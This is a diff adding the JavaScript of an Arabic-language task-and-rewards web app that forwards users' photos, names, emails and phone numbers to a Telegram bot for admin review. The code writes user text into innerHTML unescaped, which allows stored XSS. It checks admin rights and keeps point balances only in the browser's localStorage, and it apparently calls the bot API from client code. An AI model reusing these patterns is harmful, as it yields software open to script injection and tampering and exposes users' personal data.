+            document.getElementById('userCountry').textContent = currentUser.country;
+            document.getElementById('userCity').textContent = currentUser.city;
+            document.getElementById('userJoinDate').textContent = new Date(currentUser.joinDate).toLocaleDateString('ar-EG');
+            
+            // إظهار تبويب المسؤول إذا كان المستخدم مسؤولاً
+            if (currentUser.role === 'admin') {
+                document.getElementById('adminTab').style.display = 'block';
+            }
+            
+            updateStats();
+            renderTasks();
+            renderRewards();
+            if (currentUser.role === 'admin') {
+                renderPendingReviews();
+            }
+        }
+        
+        // تحديث الإحصائيات
+        function updateStats() {
+            document.getElementById('pointsDisplay').textContent = `${currentUser.points} نقطة`;
+            document.getElementById('totalPoints').textContent = currentUser.points;
+            document.getElementById('completedTasks').textContent = currentUser.completedTasks.length;
+            document.getElementById('pendingTasks').textContent = currentUser.pendingTasks.length;
+            document.getElementById('claimedRewards').textContent = currentUser.claimedRewards.length;
+        }
+        
+        // تبديل التبويبات
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            
+            document.querySelector(`.tab[data-tab="${tabName}"]`).classList.add('active');
+            document.getElementById(`${tabName}Tab`).classList.add('active');
+            
+            if (tabName === 'admin' && currentUser.role === 'admin') {
+                renderPendingReviews();
+            }
+        }
+        
+        // إضافة مهمة جديدة
+        function addTask(e) {
+            e.preventDefault();
+            
+            const title = document.getElementById('taskTitle').value;
+            const description = document.getElementById('taskDescription').value;
+            const points = parseInt(document.getElementById('taskPoints').value);
+            const deadline = document.getElementById('taskDeadline').value;
+            const category = document.getElementById('taskCategory').value;
+            
+            if (!title || !description || !points) {
+                showAlert('error', 'الرجاء ملء جميع الحقول المطلوبة');
+                return;
+            }
+            
+            const newTask = {
+                id: Date.now(),
+                title,
+                description,
+                points,
+                deadline: deadline || null,
+                category,
+                createdBy: currentUser.email,
+                createdAt: new Date().toISOString()
+            };
+            
+            tasks.push(newTask);
+            localStorage.setItem('redHatTasks', JSON.stringify(tasks));
+            
+            showAlert('success', 'تم إضافة المهمة بنجاح!');
+            document.getElementById('taskForm').reset();
+            renderTasks();
+        }
+        
+        // عرض المهام
+        function renderTasks() {
+            const container = document.getElementById('tasksContainer');
+            container.innerHTML = '';
+            
+            if (tasks.length === 0) {
+                container.innerHTML = '<p style="grid-column: 1/-1; text-align: center;">لا توجد مهام مضافة بعد</p>';
+                return;
+            }
+            
+            tasks.forEach(task => {
+                const isCompleted = currentUser.completedTasks.includes(task.id);
+                const isPending = currentUser.pendingTasks.includes(task.id);
+                
+                const taskCard = document.createElement('div');
+                taskCard.className = `task-card ${isPending ? 'pending-approval' : ''}`;
+                
+                const deadlineInfo = task.deadline ? 
+                    `<div class="task-meta">موعد التسليم: ${new Date(task.deadline).toLocaleDateString('ar-EG')}</div>` : '';
+                
+                let actionButton = '';
+                
+                if (isCompleted) {
+                    actionButton = '<button class="btn btn-success" disabled>مكتملة</button>';
+                } else if (isPending) {
+                    actionButton = '<button class="btn btn-disabled" disabled>في انتظار المراجعة</button>';
+                } else {
+                    actionButton = `
+                        <div class="upload-section">
+                            <p style="color: var(--primary-light); margin-bottom: 10px;">لإكمال هذه المهمة، يجب تصوير النتيجة وإرسالها</p>
+                            <input type="file" id="taskImage-${task.id}" class="file-input" accept="image/*">
+                            <label for="taskImage-${task.id}" class="upload-btn">اختر صورة</label>
+                            <button class="btn" onclick="submitTask(${task.id})" style="width: 100%; margin-top: 10px;">إرسال للمراجعة</button>
+                        </div>
+                    `;
+                }
+                
+                taskCard.innerHTML = `
+                    <div class="task-header">
+                        <div class="task-title">${task.title}</div>
+                        <div class="task-points">${task.points} نقطة</div>
+                    </div>
+                    <div class="task-description">${task.description}</div>
+                    ${deadlineInfo}
+                    <div class="task-meta">
+                        <span>الفئة: ${getCategoryName(task.category)}</span>
+                        <span>بواسطة: ${task.createdBy}</span>
+                    </div>
+                    <div class="task-actions">
+                        ${actionButton}
+                        ${currentUser.role === 'admin' ? 
+                            `<button class="btn btn-secondary" onclick="deleteTask(${task.id})" style="margin-top: 10px;">حذف</button>` : 
+                            ''
+                        }
+                    </div>
+                `;
+                
+                container.appendChild(taskCard);
+            });
+        }
+        
+        // عرض المكافآت
+        function renderRewards() {
+            const container = document.getElementById('rewardsContainer');
+            container.innerHTML = '';
+            
+            if (rewards.length === 0) {
+                container.innerHTML = '<p style="grid-column: 1/-1; text-align: center;">لا توجد مكافآت مضافة بعد</p>';
+                return;
+            }
+            
+            rewards.forEach(reward => {
+                const isClaimed = currentUser.claimedRewards.includes(reward.id);
+                const canClaim = currentUser.points >= reward.cost && !isClaimed;
+                
+                const rewardCard = document.createElement('div');
+                rewardCard.className = 'reward-card';
+                
+                rewardCard.innerHTML = `
+                    <div class="reward-icon">🎁</div>
+                    <div class="reward-title">${reward.title}</div>
+                    <div class="reward-description">${reward.description}</div>
+                    <div class="reward-cost">${reward.cost} نقطة</div>
+                    <div class="task-actions">
+                        ${isClaimed ? 
+                            '<button class="btn btn-success" disabled>تم الاستلام</button>' : 
+                            `<button class="btn ${canClaim ? '' : 'btn-disabled'}" ${canClaim ? `onclick="claimReward(${reward.id})"` : 'disabled'}>
+                                ${canClaim ? 'استبدال النقاط' : 'نقاط غير كافية'}
+                            </button>`
+                        }
+                        ${currentUser.role === 'admin' ? 
+                            `<button class="btn btn-secondary" onclick="deleteReward(${reward.id})" style="margin-top: 10px;">حذف</button>` : 
+                            ''
+                        }
+                    </div>
+                `;
+                
+                container.appendChild(rewardCard);
+            });
+        }
+        
+        // إرسال مهمة للمراجعة
+        async function submitTask(taskId) {
+            const fileInput = document.getElementById(`taskImage-${taskId}`);
+            
+            if (!fileInput || !fileInput.files[0]) {
+                showAlert('error', 'يجب اختيار صورة لإكمال المهمة');
+                return;
+            }
+            
+            const task = tasks.find(t => t.id === taskId);
+            if (!task) return;
+            
+            // عرض تحميل
+            const submitBtn = fileInput.parentElement.querySelector('.btn');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<span class="loading"></span> جاري الإرسال...';
+            submitBtn.disabled = true;
+            
+            try {
+                const imageData = await readFileAsDataURL(fileInput.files[0]);
+                
+                // إضافة المهمة لقائمة المهام المنتظرة
+                const pendingReview = {
+                    id: Date.now(),
+                    taskId: taskId,
+                    userId: currentUser.email,
+                    image: imageData,
+                    submittedAt: new Date().toISOString(),
+                    status: 'pending'
+                };
+                
+                pendingReviews.push(pendingReview);
+                localStorage.setItem('redHatPendingReviews', JSON.stringify(pendingReviews));
+                
+                // إضافة المهمة لقائمة المهام المنتظرة للمستخدم
+                if (!currentUser.pendingTasks.includes(taskId)) {
+                    currentUser.pendingTasks.push(taskId);
+                    
+                    // تحديث بيانات المستخدم في التخزين المحلي
+                    const userIndex = users.findIndex(u => u.email === currentUser.email);
+                    if (userIndex !== -1) {
+                        users[userIndex] = currentUser;
+                        localStorage.setItem('redHatUsers', JSON.stringify(users));
+                        localStorage.setItem('currentUser', JSON.stringify(currentUser));
+                    }
+                }
+                
+                // إرسال الصورة لبوت التلجرام
+                const telegramSent = await sendToTelegram(task, currentUser, fileInput.files[0]);
+                
+                if (telegramSent) {
+                    showAlert('success', 'تم إرسال المهمة للمراجعة بنجاح! سيتم إعلام المسؤول.');
+                } else {
+                    showAlert('info', 'تم حفظ المهمة محلياً ولكن فشل الإرسال للتلجرام. سيتم المراجعة يدوياً.');
+                }
+                
+                updateStats();
+                renderTasks();
+                
+            } catch (error) {
+                console.error('خطأ في معالجة الملف:', error);
+                showAlert('error', 'حدث خطأ في معالجة الصورة. حاول مرة أخرى.');
+            } finally {
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+            }
+        }
+        
+        // قراءة الملف كـ DataURL
+        function readFileAsDataURL(file) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(reader.result);
+                reader.onerror = reject;
+                reader.readAsDataURL(file);
+            });
+        }
+        
+        // إرسال الصورة لبوت التلجرام
+        async function sendToTelegram(task, user, imageFile) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', imageFile);
+                
+                // نص الرسالة
+                const message = `🆕 مهمة جديدة تحتاج للمراجعة\n\n` +
+                               `👤 المستخدم: ${user.name}\n` +
+                               `📧 البريد: ${user.email}\n` +
+                               `📞 الهاتف: ${user.phone}\n` +
+                               `📝 المهمة: ${task.title}\n` +
+                               `📋 الوصف: ${task.description}\n` +
+                               `⭐ النقاط: ${task.points}\n` +
+                               `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n\n` +
+                               `🔗 رابط النظام: ${window.location.href}`;
+                
+                formData.append('caption', message);
+                
+                // إرسال الصورة
+                const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await telegramResponse.json();
+                
+                if (result.ok) {
+                    console.log('✅ تم إرسال الصورة للتلجرام بنجاح');
+                    return true;
+                } else {
+                    console.error('❌ خطأ في إرسال الصورة للتلجرام:', result);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ خطأ في الإرسال للتلجرام:', error);
+                return false;
+            }
+        }
+        
+        // إرسال إشعار عام للتلجرام
+        async function sendTelegramNotification(title, message) {
+            try {
+                const fullMessage = `🔔 ${title}\n\n${message}`;
+                
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: fullMessage,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('❌ خطأ في إرسال الإشعار للتلجرام:', error);
+                return false;
+            }
+        }
+        
+        // عرض المهام المنتظرة للمراجعة (للمسؤول فقط)
+        function renderPendingReviews() {
+            if (currentUser.role !== 'admin') return;
+            
+            const container = document.getElementById('pendingTasksContainer');
+            const statusContainer = document.getElementById('telegramStatus');
+            container.innerHTML = '';
+            
+            // عرض حالة الاتصال بالتلجرام
+            statusContainer.innerHTML = `
+                <div class="telegram-status telegram-success">
+                    ✅ النظام مرتبط ببوت التلجرام - جاهز لاستقبال المهام
+                </div>
+            `;
+            
+            if (pendingReviews.length === 0) {
+                container.innerHTML = '<p style="grid-column: 1/-1; text-align: center;">لا توجد مهام في انتظار المراجعة</p>';
+                return;
+            }
+            
+            pendingReviews.forEach(review => {
+                if (review.status !== 'pending') return;
+                
+                const task = tasks.find(t => t.id === review.taskId);
+                const user = users.find(u => u.email === review.userId);
+                
+                if (!task || !user) return;
+                
+                const reviewCard = document.createElement('div');
+                reviewCard.className = 'task-card';
+                
+                reviewCard.innerHTML = `
+                    <div class="task-header">
+                        <div class="task-title">${task.title}</div>
+                        <div class="task-points">${task.points} نقطة</div>
+                    </div>
+                    <div class="task-description">
+                        <strong>المستخدم:</strong> ${user.name}<br>
+                        <strong>البريد:</strong> ${user.email}<br>
+                        <strong>الهاتف:</strong> ${user.phone}<br>
+                        <strong>وقت الإرسال:</strong> ${new Date(review.submittedAt).toLocaleString('ar-EG')}
+                    </div>
+                    <div>
+                        <strong>الصورة المرفوعة:</strong>
+                        <img src="${review.image}" class="task-image" alt="صورة المهمة">
+                    </div>
+                    <div class="task-actions">
+                        <button class="btn btn-success" onclick="approveTask(${review.id})">الموافقة</button>
+                        <button class="btn btn-secondary" onclick="rejectTask(${review.id})">رفض</button>
+                    </div>
+                `;
+                
+                container.appendChild(reviewCard);
+            });
+        }
+        
+        // الموافقة على مهمة (للمسؤول فقط)
+        async function approveTask(reviewId) {
+            const reviewIndex = pendingReviews.findIndex(r => r.id === reviewId);
+            if (reviewIndex === -1) return;
+            
+            const review = pendingReviews[reviewIndex];
+            const task = tasks.find(t => t.id === review.taskId);
+            const user = users.find(u => u.email === review.userId);
+            
+            if (!task || !user) return;
+            
+            // تحديث حالة المراجعة
+            pendingReviews[reviewIndex].status = 'approved';
+            pendingReviews[reviewIndex].approvedAt = new Date().toISOString();
+            localStorage.setItem('redHatPendingReviews', JSON.stringify(pendingReviews));
+            
+            // تحديث بيانات المستخدم
+            const userIndex = users.findIndex(u => u.email === review.userId);
+            if (userIndex !== -1) {
+                // إزالة المهمة من قائمة المهام المنتظرة
+                users[userIndex].pendingTasks = users[userIndex].pendingTasks.filter(id => id !== review.taskId);
+                
+                // إضافة المهمة لقائمة المهام المكتملة
+                if (!users[userIndex].completedTasks.includes(review.taskId)) {
+                    users[userIndex].completedTasks.push(review.taskId);
+                }
+                
+                // منح النقاط
+                users[userIndex].points += task.points;
+                
+                localStorage.setItem('redHatUsers', JSON.stringify(users));
+                
+                // تحديث المستخدم الحالي إذا كان هو المعني
+                if (currentUser.email === review.userId) {
+                    currentUser = users[userIndex];
+                    localStorage.setItem('currentUser', JSON.stringify(currentUser));
+                }
+            }
+            
+            // إرسال إشعار للمستخدم عبر التلجرام
+            await sendTelegramNotification(
+                '✅ تمت الموافقة على مهمتك!',
+                `📝 المهمة: ${task.title}\n` +
+                `⭐ النقاط الممنوحة: ${task.points}\n` +
+                `💰 رصيدك الحالي: ${user.points + task.points} نقطة\n\n` +
+                `🎉 تهانينا! استمر في العمل الجيد.`
+            );
+            
+            showAlert('success', `تمت الموافقة على المهمة وتم منح ${task.points} نقطة للمستخدم ${user.name}`);
+            renderPendingReviews();
+            updateStats();
+            
+            if (currentUser.email === review.userId) {
+                renderTasks();
+                renderRewards();
+            }
+        }
+        
+        // رفض مهمة (للمسؤول فقط)
+        async function rejectTask(reviewId) {
+            const reviewIndex = pendingReviews.findIndex(r => r.id === reviewId);
+            if (reviewIndex === -1) return;
+            
+            const review = pendingReviews[reviewIndex];
+            const task = tasks.find(t => t.id === review.taskId);
+            const user = users.find(u => u.email === review.userId);
+            
+            // تحديث حالة المراجعة
+            pendingReviews[reviewIndex].status = 'rejected';
+            localStorage.setItem('redHatPendingReviews', JSON.stringify(pendingReviews));
+            
+            // إزالة المهمة من قائمة المهام المنتظرة للمستخدم
+            const userIndex = users.findIndex(u => u.email === review.userId);
+            if (userIndex !== -1) {
+                users[userIndex].pendingTasks = users[userIndex].pendingTasks.filter(id => id !== review.taskId);
+                localStorage.setItem('redHatUsers', JSON.stringify(users));
+                
+                // تحديث المستخدم الحالي إذا كان هو المعني
+                if (currentUser.email === review.userId) {
+                    currentUser = users[userIndex];
+                    localStorage.setItem('currentUser', JSON.stringify(currentUser));
+                }
+            }
+            
+            // إرسال إشعار للمستخدم عبر التلجرام
+            await sendTelegramNotification(
+                '❌ تم رفض مهمتك',
+                `📝 المهمة: ${task.title}\n` +
+                `💡 السبب: لم تستوفِ شروط المهمة\n\n` +
+                `🔄 يمكنك إعادة المحاولة أو اختيار مهمة أخرى.`
+            );
+            
+            showAlert('info', `تم رفض المهمة للمستخدم ${user.name}`);
+            renderPendingReviews();
+            updateStats();
+            
+            if (currentUser.email === review.userId) {
+                renderTasks();
+            }
+        }
+        
+        // استبدال نقاط بمكافأة
+        function claimReward(rewardId) {
+            const reward = rewards.find(r => r.id === rewardId);
+            if (!reward) return;
+            
+            if (currentUser.points < reward.cost) {
+                showAlert('error', 'ليس لديك نقاط كافية لاستبدال هذه المكافأة');
+                return;
+            }
+            
+            if (currentUser.claimedRewards.includes(rewardId)) {
+                showAlert('error', 'لقد استلمت هذه المكافأة بالفعل');
+                return;
+            }
+            
+            currentUser.claimedRewards.push(rewardId);
+            currentUser.points -= reward.cost;
+            
+            // تحديث بيانات المستخدم في التخزين المحلي
+            const userIndex = users.findIndex(u => u.email === currentUser.email);
+            if (userIndex !== -1) {
+                users[userIndex] = currentUser;
+                localStorage.setItem('redHatUsers', JSON.stringify(users));
+                localStorage.setItem('currentUser', JSON.stringify(currentUser));
+            }
+            
+            showAlert('success', `مبروك! لقد استلمت المكافأة: ${reward.title}`);
+            updateStats();
+            renderRewards();
+        }
+        
+        // حذف مهمة (للمسؤول فقط)
+        function deleteTask(taskId) {
+            if (confirm('هل أنت متأكد من حذف هذه المهمة؟')) {
+                tasks = tasks.filter(task => task.id !== taskId);
+                localStorage.setItem('redHatTasks', JSON.stringify(tasks));
+                renderTasks();
+                showAlert('success', 'تم حذف المهمة بنجاح');
+            }
+        }
+        
+        // حذف مكافأة (للمسؤول فقط)
+        function deleteReward(rewardId) {
+            if (confirm('هل أنت متأكد من حذف هذه المكافأة؟')) {
+                rewards = rewards.filter(reward => reward.id !== rewardId);
+                localStorage.setItem('redHatRewards', JSON.stringify(rewards));
+                renderRewards();
+                showAlert('success', 'تم حذف المكافأة بنجاح');
+            }
+        }
+        
+        // الحصول على اسم الفئة بالعربية
+        function getCategoryName(category) {
+            const categories = {
+                'work': 'عمل',
+                'study': 'دراسة',
+                'personal': 'شخصي',
+                'health': 'صحة',
+                'other': 'أخرى',
+                'entertainment': 'ترفيه',
+                'shopping': 'تسوق',
+                'food': 'طعام',
+                'experience': 'تجربة'
+            };
+            
+            return categories[category] || category;
+        }
+        
+        // عرض رسالة تنبيه
+        function showAlert(type, message) {
+            const alert = document.getElementById(`${type}Alert`);
+            alert.textContent = message;
+            alert.style.display = 'block';
+            setTimeout(() => alert.style.display = 'none', 5000);
+        }
+    </script>
+</body>
+</html>
